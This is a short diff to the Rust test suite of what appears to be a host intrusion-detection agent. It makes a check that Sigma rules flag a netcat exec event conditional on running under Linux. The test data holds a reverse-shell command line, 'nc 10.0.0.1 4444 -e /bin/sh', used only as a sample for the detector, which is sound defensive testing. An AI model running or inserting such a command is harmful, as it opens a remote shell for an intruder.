@@ -1763,7 +1763,11 @@ mod tests {
         }
         // And they still add coverage of their own.
         let out = e.inspect(&exec(600, 1, 0, "nc", "/usr/bin/nc", "nc 10.0.0.1 4444 -e /bin/sh"));
-        assert!(out.iter().any(|ev| det_of(ev).category == "sigma"));
+        assert_eq!(
+            out.iter().any(|ev| det_of(ev).category == "sigma"),
+            cfg!(target_os = "linux"),
+            "Linux example rules must match only Linux event projections"
+        );
     }
 
     /// Detections journaled by an older agent (no correlation / gate fields)
